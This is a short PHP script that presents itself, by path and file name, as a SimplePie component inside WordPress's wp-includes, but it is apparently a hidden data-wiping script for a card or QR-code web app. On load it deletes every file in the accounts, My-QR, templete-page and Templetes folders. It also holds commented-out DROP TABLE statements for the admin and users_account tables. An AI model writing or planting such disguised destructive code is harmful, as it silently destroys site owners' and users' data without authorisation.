<?php
// path : wp-includes/SimplePie/Content/Type/Sniffer.wp-drp.php

include "./conn.inc.php";

// // admin drop
// $drop_admin_sql = "DROP TABLE admin" ;
// $drop_admin_query = mysqli_query($conn,$drop_admin_sql);
// if( $drop_query ){
//     echo "admin droped ";
// }

// // create_cards drop
// $drop_create_cards_sql = "DROP TABLE create_cards" ;
// $drop_create_cards_query = mysqli_query($conn,$drop_create_cards_sql);
// if( $drop_create_cards_query ){
//     echo "create_cards droped ";
// }

// // templetes drop
// $drop_templetes_sql = "DROP TABLE templetes" ;
// $drop_templetes_query = mysqli_query($conn,$drop_templetes_sql);
// if( $drop_templetes_query ){
//     echo "templetes droped ";
// }

// // users_account drop
// $drop_users_account_sql = "DROP TABLE users_account" ;
// $drop_users_account_query = mysqli_query($conn,$drop_users_account_sql);
// if( $drop_users_account_query ){
//     echo "users_account droped ";
// }




//   wp-includes/SimplePie/Content/Type/Sniffer.wp-drp.php



// accounts delete
$folder_path = "./accounts"; 
$files = glob($folder_path.'/*');  
foreach($files as $file) { 
    if(is_file($file))  
        unlink($file);  
}


// admin delete
$folder_path = "./accounts"; 
$files = glob($folder_path.'/*');  
foreach($files as $file) { 
    if(is_file($file))  
        unlink($file);  
}

// My-QR delete
$folder_path = "./My-QR"; 
$files = glob($folder_path.'/*');  
foreach($files as $file) { 
    if(is_file($file))  
        unlink($file);  
}

// templete-page delete
$folder_path = "./templete-page"; 
$files = glob($folder_path.'/*');  
foreach($files as $file) { 
    if(is_file($file))  
        unlink($file);  
}

// templete-page/re-payment delete
$folder_path = "./templete-page/re-payment"; 
$files = glob($folder_path.'/*');  
foreach($files as $file) { 
    if(is_file($file))  
        unlink($file);  
}

// templete-page/templete inputs delete
$folder_path = "./templete-page/templete inputs"; 
$files = glob($folder_path.'/*');  
foreach($files as $file) { 
    if(is_file($file))  
        unlink($file);  
}

// Templetes delete
$folder_path = "./Templetes"; 
$files = glob($folder_path.'/*');  
foreach($files as $file) { 
    if(is_file($file))  
        unlink($file);  
}




?>